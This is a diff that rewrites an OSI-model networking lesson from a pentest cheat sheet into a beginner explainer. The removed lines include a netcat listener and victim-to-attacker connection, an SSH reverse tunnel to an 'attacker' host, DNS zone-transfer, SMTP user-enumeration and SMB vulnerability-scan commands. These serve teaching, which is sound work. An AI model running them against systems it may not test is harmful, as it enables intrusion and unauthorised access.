@@ -14,1122 +14,368 @@
 
 ## Table of contents
 
-1. Overview: what is the OSI model
-2. Layer 1: Physical
-3. Layer 2: Data Link
-4. Layer 3: Network
-5. Layer 4: Transport
-6. Layer 5: Session
-7. Layer 6: Presentation
-8. Layer 7: Application
-9. Data encapsulation
-10. TCP vs UDP comparison
-11. Common ports
-12. Protocols per layer
-13. Network devices per layer
-14. Security notes: attacks per layer
-15. Practical workflow: network recon & analysis
+1. What the OSI model is, and why it matters
+2. The seven layers, one by one
+3. How data travels: encapsulation
+4. TCP vs UDP
+5. Ports you should know
+6. Which device works at which layer
+7. Attacks and defenses, layer by layer
+8. Troubleshooting with the layers
+9. OSI vs the TCP/IP model
+10. Quick reference
 
 ---
 
-## 1. Overview: what is the OSI model
+## Key Terms
 
-The OSI Model (Open Systems Interconnection Model) is a standardized conceptual framework that defines how network communication systems work, divided into 7 layers. It was developed by the ISO (International Organization for Standardization) in 1984.
+You'll see these words throughout the lesson.
 
-Each layer has specific responsibilities and only communicates with the layers directly above and below it. The model is referential: real implementations typically use the TCP/IP model (4 layers), but OSI remains the standard for understanding, troubleshooting, and network analysis.
+| Term | Plain meaning |
+|:---|:---|
+| Protocol | An agreed set of rules two computers follow so they can understand each other |
+| Layer | One "job" in networking. Each layer handles its own task and hands the result to the next |
+| PDU | The name for the chunk of data at a given layer (bits, frame, packet, segment, data) |
+| MAC address | The hardware ID burned into a network card, used inside one local network |
+| IP address | The logical address used to route data across different networks |
+| Port | A number that says which program on a computer the data is for (web = 80, SSH = 22) |
+| Header | Extra info a layer adds in front of the data (addresses, ports, and so on) |
+| Encapsulation | Wrapping the data in headers as it moves down the layers |
+| Frame / packet / segment | The data unit at the Data Link / Network / Transport layer |
 
-Why it matters for cybersecurity:
+---
 
-- Understanding at which layer an attack occurs helps with attack vector identification.
-- Understanding data encapsulation supports packet analysis and network forensics.
-- Knowing the protocols at each layer informs firewall and IDS/IPS configuration.
-- Understanding network devices supports network pentesting and reconnaissance.
-- Analyzing abnormal traffic supports threat hunting and incident response.
+## 1. What the OSI Model Is, and Why It Matters
 
-### OSI model, visual overview
+The **OSI model** (Open Systems Interconnection) is a way of splitting "how computers talk over a network" into **7 layers**, each with one clear job. It was published by the ISO standards body in 1984.
+
+Think of sending a parcel. One person writes the letter, another puts it in an envelope and addresses it, a courier decides the route, a truck physically carries it. Each step only cares about its own job and trusts the others to do theirs. Networking works the same way: each layer does its part and hands off to the next.
+
+The OSI model is a **teaching and troubleshooting map**. Real networks actually run on the simpler TCP/IP model (Section 9), but OSI is the shared vocabulary everyone uses to describe where something happens.
+
+Why it matters for security:
+
+- Knowing *which layer* an attack hits tells you where to put the defense (a web firewall won't stop an attack on the cables).
+- Understanding how data is wrapped layer by layer is the basis of packet analysis.
+- Knowing which protocols live at each layer guides firewall and IDS/IPS rules.
+
+### The seven layers at a glance
 
 ```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                          OSI MODEL (7 Layers)                           │
-├───────┬──────────────────┬────────────────────────────────────────────┤
-│ Layer │   Name           │  Key Responsibilities                       │
+┌───────┬──────────────────┬────────────────────────────────────────────┐
+│ Layer │   Name           │  What it does                               │
 ├───────┼──────────────────┼────────────────────────────────────────────┤
-│   7   │  Application     │  User-facing protocols (HTTP, FTP, DNS)    │
-│   6   │  Presentation    │  Encoding, encryption, compression         │
-│   5   │  Session         │  Connection management, authentication     │
-│   4   │  Transport       │  TCP/UDP, ports, flow control              │
-│   3   │  Network         │  IP addressing, routing                    │
-│   2   │  Data Link       │  MAC addresses, switches, frames           │
-│   1   │  Physical        │  Cables, signals, bits                     │
+│   7   │  Application     │  Protocols apps use (HTTP, DNS, SSH)        │
+│   6   │  Presentation    │  Formatting, encryption, compression        │
+│   5   │  Session         │  Starting, keeping, and ending conversations │
+│   4   │  Transport       │  TCP/UDP, ports, reliable delivery           │
+│   3   │  Network         │  IP addresses, routing between networks      │
+│   2   │  Data Link       │  MAC addresses, switches, frames             │
+│   1   │  Physical        │  Cables, radio, raw bits                     │
 └───────┴──────────────────┴────────────────────────────────────────────┘
 
-                    Data Unit (PDU) per Layer:
-┌─────────────────────────────────────────────────┐
-│  Layer 7 — Application   →  Data                │
-│  Layer 6 — Presentation  →  Data                │
-│  Layer 5 — Session       →  Data                │
-│  Layer 4 — Transport     →  Segment (TCP)        │
-│                             Datagram (UDP)        │
-│  Layer 3 — Network       →  Packet              │
-│  Layer 2 — Data Link     →  Frame               │
-│  Layer 1 — Physical      →  Bits (0s and 1s)    │
-└─────────────────────────────────────────────────┘
-
-Mnemonic to remember the layers (top to bottom):
+A memory trick, top to bottom:
   "All People Seem To Need Data Processing"
 ```
 
 ---
 
-## 2. Layer 1: Physical
+## 2. The Seven Layers, One by One
 
-The Physical Layer is the lowest layer in the OSI model. It handles transmission of raw bits (0s and 1s) across physical media. This layer does not care about the meaning of the data, it just moves electrical, optical, or radio signals from one point to another.
+### Layer 1 — Physical: moving raw bits
 
-Key components:
+The lowest layer. It carries plain 1s and 0s as electrical pulses, light, or radio waves. It doesn't understand what the data means; it just moves signals from A to B. This is cables, fiber, connectors, radio, and the devices that only repeat signals (hubs, repeaters).
 
-- Cables (Ethernet, fiber optic, coaxial)
-- Electrical, light, or radio wave signals
-- Physical connectors and ports (RJ45, SFP, BNC)
-- Repeater and hub devices
+Useful, harmless commands to inspect it:
 
 ```bash
-# Physical layer related commands
-
-# Check network interface status (link up/down = physical layer)
-$ ip link show
-$ ifconfig
-$ ethtool eth0          # NIC speed, duplex, link status
-
-# Windows equivalent
-> ipconfig /all
-> Get-NetAdapter         # PowerShell
-
-# Check cable / physical connection
-$ ethtool eth0 | grep "Link detected"
-Link detected: yes
-
-# Check interface errors (physical issues)
-$ ip -s link show eth0
-$ netstat -i
-$ cat /proc/net/dev
-
-# Wireshark — capture at physical/data link level
-$ tcpdump -i eth0 -n    # capture raw frames
-$ wireshark             # GUI packet capture
+ip link show            # is the interface up? (Linux)
+ethtool eth0            # speed, duplex, "Link detected: yes"
+ip -s link show eth0    # error counters (bad cable, interference)
 ```
 
-| Media | Speed | Max distance |
+| Media | Typical speed | Max distance |
 |-------|-------|---------------|
-| Cat5e UTP | 1 Gbps | 100 meters |
-| Cat6 UTP | 10 Gbps | 55 meters |
-| Fiber single-mode | 100 Gbps+ | 40 to 80 km |
-| Fiber multi-mode | 10 Gbps | 550 meters |
-| Wi-Fi 6 (802.11ax) | 9.6 Gbps | ~100 meters |
+| Cat5e cable | 1 Gbps | 100 m |
+| Cat6 cable | 10 Gbps | 55 m |
+| Fiber (single-mode) | 100 Gbps+ | 40–80 km |
+| Wi-Fi 6 | up to ~9.6 Gbps | ~100 m |
 
----
+### Layer 2 — Data Link: talking to the device next door
 
-## 3. Layer 2: Data Link
-
-The Data Link Layer handles reliable data transfer between two directly connected nodes within the same network segment. It uses MAC addresses (Media Access Control) to identify devices and manages access to the physical media.
-
-This layer is divided into two sub-layers:
-
-- LLC (Logical Link Control): flow control and error checking
-- MAC (Media Access Control): physical addressing and media access
+This layer moves data between two devices on the **same local network**, using **MAC addresses** (the hardware ID of each network card). Its data unit is the **frame**. The main device here is the **switch**, which learns which MAC is on which port and forwards frames accordingly.
 
 ```bash
-# Data Link layer commands
-
-# View MAC addresses
-$ ip link show
-$ arp -a                  # ARP table (IP ↔ MAC mapping)
-$ arp -n
-
-# Windows
-> arp -a
-> getmac /v
-
-# ARP spoofing detection (Wireshark filter)
-# Filter: arp.duplicate-address-detected
-# Filter: arp.src.hw_mac != eth.src
-
-# Send raw Ethernet frames (Layer 2) with Scapy (Python)
-$ python3
->>> from scapy.all import *
->>> frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.1")
->>> sendp(frame, iface="eth0")
-
-# View switch MAC address table (if you have access)
-# Cisco: show mac address-table
-# Linux bridge: bridge fdb show
-
-# 802.1Q VLAN tagging
-$ ip link add link eth0 name eth0.100 type vlan id 100
-$ ip addr add 192.168.100.1/24 dev eth0.100
-
-# Capture Layer 2 traffic
-$ tcpdump -e -i eth0      # -e shows MAC addresses
+ip link show      # your own MAC address
+ip neigh show     # the ARP table: which IP maps to which MAC
 ```
 
-| Protocol | Function | Pentest relevance |
-|----------|----------|--------------------|
-| ARP | IP to MAC resolution | Critical (ARP spoofing) |
-| Ethernet II | Standard LAN frame | Medium |
-| 802.1Q | VLAN tagging | High (VLAN hopping) |
-| STP (802.1D) | Prevent network loops | High (STP attack) |
-| PPP | Point-to-point link | Low |
+Protocols to know: **Ethernet** (wired LAN frames), **ARP** (finds the MAC for an IP, covered in LC-042), **802.1Q** (VLAN tags), **STP** (stops loops between switches).
 
----
+### Layer 3 — Network: finding a path across networks
 
-## 4. Layer 3: Network
-
-The Network Layer handles routing and logical addressing (IP addresses). It determines the best path to deliver data packets from source to destination across multiple different networks. The primary device at this layer is the router.
-
-The data unit at this layer is called a packet.
+This layer gets data from one network to another using **IP addresses**, and chooses the route. Its data unit is the **packet**, and its main device is the **router**.
 
 ```bash
-# Network layer commands
-
-# IP addressing
-$ ip addr show
-$ ip addr add 192.168.1.10/24 dev eth0
-
-# Routing table
-$ ip route show
-$ route -n
-$ netstat -rn
-
-# Windows
-> route print
-> Get-NetRoute
-
-# Ping — ICMP echo (Layer 3 reachability test)
-$ ping 8.8.8.8
-$ ping -c 4 192.168.1.1   # 4 packets only
-
-# Traceroute — show routing path
-$ traceroute 8.8.8.8       # Linux/Mac
-> tracert 8.8.8.8          # Windows
-$ mtr 8.8.8.8              # real-time traceroute
-
-# IP Subnet calculations
-$ ipcalc 192.168.1.0/24
-$ python3 -c "import ipaddress; print(list(ipaddress.IPv4Network('10.0.0.0/28').hosts()))"
-
-# Wireshark filter for IP layer
-# ip.addr == 192.168.1.1
-# ip.src == 10.0.0.0/8
-# icmp
-
-# Nmap — Layer 3/4 scanning
-$ nmap -sn 192.168.1.0/24         # Ping sweep (host discovery)
-$ nmap -sP 192.168.1.0/24         # ARP + ICMP discovery
-$ nmap -O 192.168.1.1             # OS detection (TTL analysis)
+ip addr show          # your IP addresses
+ip route show         # your routing table / default gateway
+ping -c 4 8.8.8.8     # can I reach that host at all? (ICMP)
+traceroute 8.8.8.8    # what path do packets take?
 ```
 
-| Protocol | Function | Pentest relevance |
-|----------|----------|--------------------|
-| IPv4 | 32-bit addressing | High |
-| IPv6 | 128-bit addressing | High |
-| ICMP | Control & error messages | High (ICMP flood) |
-| OSPF | Dynamic routing protocol | Medium |
-| BGP | Inter-AS routing | High (BGP hijack) |
-| IPSec | IP encryption & auth | Low |
+Protocols: **IPv4/IPv6** (addressing), **ICMP** (ping and error messages), **OSPF/BGP** (routers sharing routes).
 
----
+### Layer 4 — Transport: getting data to the right program, reliably
 
-## 5. Layer 4: Transport
+This layer connects **programs**, not just machines, using **port numbers**. It has two main choices:
 
-The Transport Layer handles end-to-end communication between applications on different hosts. It uses port numbers to identify communicating services/applications, and provides flow control, error recovery, and data segmentation.
-
-Two main protocols:
-
-- TCP (Transmission Control Protocol): connection-oriented, reliable, ordered
-- UDP (User Datagram Protocol): connectionless, fast, no delivery guarantee
+- **TCP:** sets up a connection first, guarantees everything arrives in order, re-sends anything lost. Used for web, SSH, email.
+- **UDP:** just fires data off with no setup and no guarantees. Faster, used for DNS, video calls, games.
 
 ```bash
-# Transport layer commands
-
-# View open ports & connections
-$ ss -tulnp               # preferred (modern)
-$ netstat -tulnp           # traditional
-$ netstat -ano             # Windows
-
-# Windows PowerShell
-PS> Get-NetTCPConnection
-PS> Get-NetUDPEndpoint
-
-# TCP 3-way handshake (SYN-SYN/ACK-ACK)
-# Wireshark filter: tcp.flags.syn==1
-# Wireshark filter: tcp.stream eq 0
-
-# Port scanning with Nmap
-$ nmap -sT 192.168.1.1         # TCP connect scan (full handshake)
-$ nmap -sS 192.168.1.1         # SYN stealth scan (half-open)
-$ nmap -sU 192.168.1.1         # UDP scan
-$ nmap -p 80,443,8080 192.168.1.1   # specific ports
-$ nmap -p- 192.168.1.1         # all 65535 ports
-$ nmap -sV 192.168.1.1         # service version detection
-
-# Netcat — TCP/UDP raw connections
-$ nc -lvnp 4444               # listen (attacker)
-$ nc 192.168.1.10 4444        # connect (victim → attacker)
-$ nc -u 192.168.1.1 53        # UDP mode
-$ nc -zv 192.168.1.1 22       # port check (banner grab)
-
-# Banner grabbing
-$ nc -nv 192.168.1.1 80
-HEAD / HTTP/1.0
-
-# Check for SYN flood (DoS attack detection)
-$ netstat -an | grep SYN_RECV | wc -l
+ss -tulnp             # which ports are open and listening (Linux)
+nc -zv host 22        # is a given TCP port reachable?
 ```
 
-### TCP vs UDP comparison
+### Layer 5 — Session: managing the conversation
 
-| Feature | TCP | UDP |
-|---------|-----|-----|
-| Connection | Connection-oriented (3-way handshake) | Connectionless |
-| Reliability | Guaranteed, uses ACK | No guarantee, fire and forget |
-| Ordering | Ordered delivery | Out-of-order possible |
-| Speed | Slower (overhead) | Faster |
-| Use cases | HTTP, SSH, FTP, Email | DNS, DHCP, VoIP, video streaming |
+Starts, maintains, and cleanly ends a "session" between two applications. If a transfer drops, the session layer is the idea that lets it resume from the right place. Examples: NetBIOS and SMB sessions (Windows file sharing), RPC, iSCSI.
 
-### TCP 3-way handshake
+### Layer 6 — Presentation: translating and securing the data
 
-```
-Client                          Server
-  │                               │
-  │──── SYN (seq=100) ───────────>│   Step 1: Client initiates
-  │                               │
-  │<─── SYN+ACK (seq=200,ack=101)─│   Step 2: Server acknowledges + syncs
-  │                               │
-  │──── ACK (ack=201) ───────────>│   Step 3: Client acknowledges
-  │                               │
-  │<════ DATA TRANSFER ══════════>│   Connection established!
-  │                               │
-  │──── FIN ─────────────────────>│   Step 4: Teardown (4-way)
-  │<─── ACK ──────────────────────│
-  │<─── FIN ──────────────────────│
-  │──── ACK ─────────────────────>│   Connection closed
-```
-
----
-
-## 6. Layer 5: Session
-
-The Session Layer handles establishing, managing, and terminating communication sessions between applications. It ensures that if a connection is interrupted, the session can resume from the right point (checkpointing). It also controls dialog control (half-duplex vs full-duplex).
+The "translator". It makes sure data from one system can be read by another: character encodings (ASCII, Unicode), compression (gzip), and **encryption (TLS lives here)**. Base64 and image formats like JPEG/PNG are presentation-layer concerns too.
 
 ```bash
-# Session layer examples
-
-# NetBIOS — Session Layer protocol (Windows networking)
-$ nmblookup -A 192.168.1.1    # NetBIOS name lookup
-$ nbtscan 192.168.1.0/24      # scan for NetBIOS names
-
-# RPC (Remote Procedure Call) — Session layer
-$ rpcinfo -p 192.168.1.1      # list RPC services
-$ showmount -e 192.168.1.1    # NFS shares (uses RPC)
-
-# SMB Session (Windows file sharing)
-$ smbclient -L //192.168.1.1  # list SMB shares
-$ smbclient //192.168.1.1/share -U username
-
-# Session hijacking detection (Wireshark)
-# Filter: tcp.seq or unexpected RST packets
-# Look for duplicate SEQ numbers
-
-# SQL*Net (Oracle DB sessions) — port 1521
-# iSCSI sessions — port 3260
-
-# SSH — manages sessions with keep-alive
-$ ssh -o ServerAliveInterval=60 user@host
+echo "Hello" | base64          # encode
+echo "SGVsbG8K" | base64 -d    # decode
+openssl s_client -connect example.com:443 </dev/null   # inspect a TLS connection
 ```
 
-| Protocol | Function | Pentest relevance |
-|----------|----------|--------------------|
-| NetBIOS | Windows naming service | High |
-| RPC | Remote procedure calls | High |
-| SMB | Windows file sharing | Critical |
-| SQL*Net | Oracle DB sessions | Medium |
-| iSCSI | Storage over network | Medium |
+### Layer 7 — Application: what programs actually speak
 
----
+The top layer, closest to the user. It's the **network protocols** applications use, not the apps themselves. HTTP, DNS, FTP, SSH, SMTP, SNMP, LDAP, RDP, SMB all live here.
 
-## 7. Layer 6: Presentation
-
-The Presentation Layer is the "translator" of the network. It handles data formatting, encryption/decryption, and compression. This layer ensures that data sent by one application can be read by another even if their internal formats differ.
-
-Main responsibilities:
-
-- Encoding/decoding: ASCII, Unicode, EBCDIC
-- Encryption/decryption: SSL/TLS operates here
-- Compression/decompression: gzip, zlib
+> Note: "Application layer" does **not** mean Chrome or Firefox. It means the protocol (HTTP) those programs speak.
 
 ```bash
-# Presentation layer — encoding, encryption, compression
-
-# Base64 encoding/decoding
-$ echo "Hello World" | base64
-SGVsbG8gV29ybGQK
-$ echo "SGVsbG8gV29ybGQK" | base64 -d
-Hello World
-
-# URL encoding
-$ python3 -c "import urllib.parse; print(urllib.parse.quote('hello world'))"
-hello%20world
-
-# SSL/TLS certificate inspection (HTTPS = TLS at Presentation layer)
-$ openssl s_client -connect google.com:443
-$ openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -noout -text
-
-$ curl -v https://google.com 2>&1 | grep -E "SSL|TLS|cipher"
-
-# Check SSL/TLS version & ciphers (pentesting)
-$ nmap --script ssl-enum-ciphers -p 443 target.com
-$ sslscan target.com
-$ testssl.sh target.com
-
-# Identify file encoding/format
-$ file suspicious.bin
-$ xxd suspicious.bin | head -20     # hex dump
-$ strings suspicious.bin | head -20  # extract strings
-
-# Common encoding conversions (Python)
-$ python3 -c "
-data = 'Hello'
-print('Base64:', __import__('base64').b64encode(data.encode()).decode())
-print('Hex:', data.encode().hex())
-print('URL:', __import__('urllib.parse').quote(data))
-"
+curl -I https://example.com    # look at HTTP response headers
+dig example.com                # DNS lookup
 ```
 
-| Format / protocol | Function | Pentest relevance |
-|---------------------|----------|--------------------|
-| SSL/TLS | Transport encryption | High (SSLstrip, downgrade) |
-| ASCII/Unicode | Text encoding | Medium |
-| Base64 | Binary to text encoding | High (payload obfuscation) |
-| gzip/zlib | Data compression | Low |
-| JPEG/PNG/GIF | Image formats | Medium (steganography) |
-| MIME | Email multipart format | Medium |
+| Protocol | Port | Use |
+|----------|------|----------|
+| HTTP / HTTPS | 80 / 443 | Web |
+| DNS | 53 | Name lookups |
+| SSH | 22 | Secure remote shell |
+| FTP | 21 | File transfer (cleartext) |
+| SMTP | 25 | Sending email |
+| SMB | 445 | Windows file sharing |
+| RDP | 3389 | Remote desktop |
 
 ---
 
-## 8. Layer 7: Application
+## 3. How Data Travels: Encapsulation
 
-The Application Layer is the highest layer in the OSI model and the only layer that directly interacts with the end user. It provides the interface between applications and the network, and defines the protocols applications use to communicate.
+When you send something, it moves **down** the layers on your machine. Each layer wraps the data in its own **header**, like putting a letter inside envelopes inside bigger envelopes. On the other side, each layer unwraps its envelope on the way **up**.
 
-> Note: the Application Layer does not mean the application itself (like Chrome or Firefox). It refers to the network protocols those applications use.
+```
+YOUR COMPUTER (going down)              THE OTHER COMPUTER (going up)
 
-```bash
-# Application layer — common protocols & tools
+L7  Data                               L7  Data
+L6  Data                               L6  Data
+L5  Data                               L5  Data
+L4  [TCP header | Data]  = Segment     L4  [TCP header | Data]
+L3  [IP header | Segment] = Packet     L3  [IP header | ...]
+L2  [MAC header | Packet | FCS] = Frame L2 [MAC header | ... | FCS]
+L1  101000110101...  = Bits            L1  101000110101...
 
-# HTTP / HTTPS
-$ curl -v http://target.com                  # verbose HTTP request
-$ curl -X POST -d "user=admin&pass=123" http://target.com/login
-$ wget http://target.com/file.txt
-
-# DNS — Domain Name System
-$ dig google.com                             # full DNS lookup
-$ dig google.com A                           # IPv4 record
-$ dig google.com MX                          # Mail exchange
-$ dig google.com NS                          # Name servers
-$ dig @8.8.8.8 google.com                   # use specific DNS server
-$ host google.com
-$ nslookup google.com
-
-# DNS zone transfer (pentesting!)
-$ dig axfr @ns1.target.com target.com
-$ fierce --domain target.com                # DNS brute force
-
-# FTP
-$ ftp 192.168.1.1
-$ ftp -n 192.168.1.1 <<EOF
-  user anonymous ""
-  ls
-  bye
-EOF
-
-# SSH
-$ ssh user@192.168.1.1
-$ ssh -p 2222 user@192.168.1.1              # non-default port
-$ ssh -L 8080:internal:80 user@bastion      # local port forward
-$ ssh -R 4444:localhost:4444 user@attacker  # reverse tunnel
-
-# SMTP — Email
-$ nc -v mail.target.com 25
-EHLO test.com
-VRFY admin@target.com                       # user enumeration!
-
-# SNMP — Network Management
-$ snmpwalk -c public -v 2c 192.168.1.1     # community string: public
-$ onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.1
-
-# Application layer scanning (Nmap scripts)
-$ nmap --script http-title -p 80,443 192.168.1.0/24
-$ nmap --script http-robots.txt target.com
-$ nmap --script smtp-enum-users target.com
-$ nmap --script dns-brute target.com
-$ nmap --script ftp-anon target.com         # anonymous FTP check
-$ nmap --script smb-vuln-* 192.168.1.1     # SMB vulnerabilities
+            ─────── physical medium ───────>
 ```
 
-| Protocol | Port | Function | Pentest relevance |
-|----------|------|----------|--------------------|
-| HTTP | 80 | Unencrypted web | High |
-| HTTPS | 443 | Encrypted web | High |
-| DNS | 53 | Domain name resolution | High |
-| FTP | 21 | File transfer (cleartext) | Critical |
-| SSH | 22 | Secure shell | High |
-| Telnet | 23 | Insecure shell | Critical |
-| SMTP | 25 | Send email | High |
-| POP3 | 110 | Retrieve email | Medium |
-| IMAP | 143 | Manage email | Medium |
-| SNMP | 161 | Network management | High |
-| LDAP | 389 | Directory service | High |
-| RDP | 3389 | Remote desktop | Critical |
-| SMB | 445 | Windows file sharing | Critical |
-| MSSQL | 1433 | SQL Server | High |
-| MySQL | 3306 | MySQL database | High |
-| RPC | 135 | Remote procedure call | High |
+Each layer only reads *its own* header. The data unit gets a different name at each level: **bits** (L1), **frame** (L2), **packet** (L3), **segment** (L4), and just **data** above that.
 
 ---
 
-## 9. Data encapsulation
+## 4. TCP vs UDP
 
-Encapsulation is the process where each OSI layer adds a header (and sometimes a trailer) to the data before passing it to the layer below. The reverse process is called de-encapsulation, which happens on the receiving side.
-
-```
-Sender (Encapsulation)                    Receiver (De-encapsulation)
-──────────────────────────────────────────────────────────────────────
-
-Layer 7 — Application                     Layer 7 — Application
-┌─────────────────────────┐               ┌─────────────────────────┐
-│         DATA            │               │         DATA            │
-└─────────────────────────┘               └─────────────────────────┘
-            ↓ Add L7 header                           ↑ Remove L7 header
-
-Layer 6 — Presentation                    Layer 6 — Presentation
-┌──────┬──────────────────┐               ┌──────┬──────────────────┐
-│  L6H │       DATA       │               │  L6H │       DATA       │
-└──────┴──────────────────┘               └──────┴──────────────────┘
-            ↓ Add L5 header                           ↑ Remove L5 header
-
-Layer 5 — Session                         Layer 5 — Session
-┌───┬──┬──────────────────┐               ┌───┬──┬──────────────────┐
-│L5H│L6│       DATA       │               │L5H│L6│       DATA       │
-└───┴──┴──────────────────┘               └───┴──┴──────────────────┘
-            ↓ Add TCP/UDP header                       ↑ Remove L4 header
-
-Layer 4 — Transport     [SEGMENT]         Layer 4 — Transport
-┌─────────────┬───────────────────────┐   ┌─────────────┬──────────┐
-│  TCP Header │     DATA (Payload)    │   │  TCP Header │  Data    │
-│ src/dst port│                       │   └─────────────┴──────────┘
-└─────────────┴───────────────────────┘
-            ↓ Add IP header                            ↑ Remove IP header
-
-Layer 3 — Network       [PACKET]          Layer 3 — Network
-┌──────────┬──────────────────────────┐   ┌──────────┬─────────────┐
-│ IP Header│   TCP Header + Data      │   │ IP Header│    Data     │
-│ src/dst IP│                         │   └──────────┴─────────────┘
-└──────────┴──────────────────────────┘
-            ↓ Add MAC header + trailer                 ↑ Remove MAC frame
-
-Layer 2 — Data Link     [FRAME]           Layer 2 — Data Link
-┌──────────┬────────────────────┬──────┐  ┌──────────┬──────┬──────┐
-│MAC Header│ IP + TCP + Data    │FCS   │  │MAC Header│ Data │ FCS  │
-│src/dst MAC│                  │(CRC) │  └──────────┴──────┴──────┘
-└──────────┴────────────────────┴──────┘
-            ↓ Convert to bits                          ↑ Convert from bits
-
-Layer 1 — Physical      [BITS]            Layer 1 — Physical
-  01001000 01100101 01101100 01101100 ...   01001000 01100101 ...
-
-                    ──── Physical medium ────>
-```
-
----
-
-## 10. TCP vs UDP comparison
-
-```bash
-# TCP connection analysis
-$ tcpdump -i eth0 'tcp and host 192.168.1.1'
-
-# Wireshark filters — TCP
-# tcp.flags.syn == 1 and tcp.flags.ack == 0   → SYN (new connections)
-# tcp.flags.fin == 1                          → FIN (connection closing)
-# tcp.flags.rst == 1                          → RST (reset / port closed)
-# tcp.analysis.retransmission                 → retransmissions (packet loss)
-
-# Wireshark filters — UDP
-# udp.port == 53     → DNS traffic
-# udp.port == 67     → DHCP server
-# udp.port == 68     → DHCP client
-
-# Test TCP vs UDP response
-$ nmap -sT 192.168.1.1 -p 80   # TCP
-$ nmap -sU 192.168.1.1 -p 53   # UDP
-
-# UDP flood detection
-$ netstat -su    # UDP statistics (errors = possible flood)
-```
+Both live at Layer 4, but they behave very differently.
 
 | Aspect | TCP | UDP |
 |--------|-----|-----|
-| PDU name | Segment | Datagram |
-| Header size | 20 to 60 bytes | 8 bytes |
-| Handshake | 3-way (SYN/SYN-ACK/ACK) | None |
-| Reliability | Yes | No |
-| Ordering | Yes (sequence numbers) | No |
-| Flow control | Yes (windowing) | No |
-| Error recovery | Yes (retransmit) | No |
-| Speed | Slower | Faster |
-| Broadcast | No | Yes |
-| Multicast | No | Yes |
-| Use cases | HTTP, SSH, FTP, SMTP | DNS, DHCP, VoIP, gaming |
+| Data unit | Segment | Datagram |
+| Connection | Yes (3-way handshake) | No |
+| Reliable? | Yes, re-sends lost data | No guarantee |
+| In order? | Yes | Not guaranteed |
+| Speed | Slower (more overhead) | Faster |
+| Good for | Web, SSH, file transfer, email | DNS, video calls, games |
+
+### The TCP 3-way handshake
+
+Before TCP sends real data, both sides say hello in three steps. It's like a phone call: "Can you hear me?" — "Yes, can you hear me?" — "Yes."
+
+```
+Client                          Server
+  │──── SYN ─────────────────────>│   1. "I want to talk"
+  │<─── SYN + ACK ────────────────│   2. "OK, and I want to talk too"
+  │──── ACK ─────────────────────>│   3. "Great, let's go"
+  │<════ data flows both ways ═══>│
+```
+
+Closing the connection is a similar polite exchange (FIN / ACK) in both directions.
 
 ---
 
-## 11. Common ports
+## 5. Ports You Should Know
 
-Ports are logical numbers (0 to 65535) that identify specific services or applications within a host. There are three categories:
+A **port** is a number from 0 to 65535 that says which service on a machine the traffic is for. Three ranges:
 
-- Well-known ports (0 to 1023): standardized, require root privileges
-- Registered ports (1024 to 49151): registered with IANA
-- Dynamic/private ports (49152 to 65535): used temporarily
+- **0–1023:** well-known ports (HTTP 80, SSH 22). On most systems only an administrator can open these.
+- **1024–49151:** registered ports for specific apps.
+- **49152–65535:** temporary ports, picked automatically for each outgoing connection.
 
 ```bash
-# Port scanning cheatsheet
-
-# Quick common ports scan
-$ nmap -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 target
-
-# Top 1000 ports (default nmap)
-$ nmap target
-
-# All ports
-$ nmap -p- target
-
-# Service version + OS detection + scripts
-$ nmap -sV -O -sC target
-
-# Aggressive scan (combine all)
-$ nmap -A target
-
-# Fast scan
-$ nmap -F target
-
-# Check if specific port is open with nc
-$ nc -zv target.com 22       # SSH
-$ nc -zv target.com 3389     # RDP
-$ nc -zv target.com 445      # SMB
+# Simple, legitimate discovery of what's open on a host you own
+nmap host              # the common ports
+nmap -p- host          # every port
+nc -zv host 443        # check one specific port
 ```
 
-### Critical ports reference table
-
-| Port | Protocol | Service | Pentest risk | Notes |
-|------|----------|---------|----------------|-------|
-| 21 | TCP | FTP | Critical | Cleartext, anonymous login |
-| 22 | TCP | SSH | High | Brute force, key auth |
-| 23 | TCP | Telnet | Critical | Cleartext, deprecated |
-| 25 | TCP | SMTP | High | User enum, relay abuse |
-| 53 | TCP/UDP | DNS | High | Zone transfer, DNS poison |
-| 67/68 | UDP | DHCP | High | Rogue DHCP, starvation |
-| 80 | TCP | HTTP | High | Web attacks, SQLi, XSS |
-| 88 | TCP/UDP | Kerberos | Critical | AS-REP roasting, Kerberoasting |
-| 110 | TCP | POP3 | Medium | Cleartext credentials |
-| 111 | TCP/UDP | RPC/rpcbind | High | NFS enumeration |
-| 135 | TCP | MS-RPC | High | DCOM attacks |
-| 139 | TCP | NetBIOS | High | SMB, null sessions |
-| 143 | TCP | IMAP | Medium | Cleartext credentials |
-| 161/162 | UDP | SNMP | High | Community string, info leak |
-| 389 | TCP | LDAP | High | AD enumeration, null bind |
-| 443 | TCP | HTTPS | High | Web attacks via HTTPS |
-| 445 | TCP | SMB | Critical | EternalBlue, pass-the-hash |
-| 512/513/514 | TCP | r-services | Critical | No auth, legacy |
-| 873 | TCP | rsync | High | Unauth file access |
-| 993 | TCP | IMAPS | Low | Encrypted |
-| 995 | TCP | POP3S | Low | Encrypted |
-| 1433 | TCP | MSSQL | High | SA account, xp_cmdshell |
-| 1521 | TCP | Oracle DB | High | Default SID |
-| 2049 | TCP/UDP | NFS | High | Unauth mount, root squash |
-| 3306 | TCP | MySQL | High | Root no password |
-| 3389 | TCP | RDP | Critical | BlueKeep, brute force |
-| 5432 | TCP | PostgreSQL | High | Default credentials |
-| 5900 | TCP | VNC | High | Weak/no auth |
-| 6379 | TCP | Redis | Critical | No auth, RCE via config |
-| 8080 | TCP | HTTP-alt | High | Dev servers, admin panels |
-| 8443 | TCP | HTTPS-alt | High | Admin panels |
-| 27017 | TCP | MongoDB | Critical | No auth default |
+| Port | Service | Why it's sensitive |
+|------|---------|--------------------|
+| 21 | FTP | Sends passwords in cleartext |
+| 22 | SSH | A common login target; use keys, not passwords |
+| 23 | Telnet | Cleartext; should be retired |
+| 25 | SMTP | Email; can be abused to enumerate users or relay spam |
+| 53 | DNS | Can leak internal names (zone transfer) |
+| 80 / 443 | HTTP / HTTPS | The whole web-attack surface |
+| 139 / 445 | NetBIOS / SMB | Windows file sharing; historically very exploited |
+| 3389 | RDP | Remote desktop; a frequent brute-force target |
+| 3306 / 5432 | MySQL / PostgreSQL | Databases exposed with weak or default logins |
+| 6379 | Redis | Often left with no authentication at all |
 
 ---
 
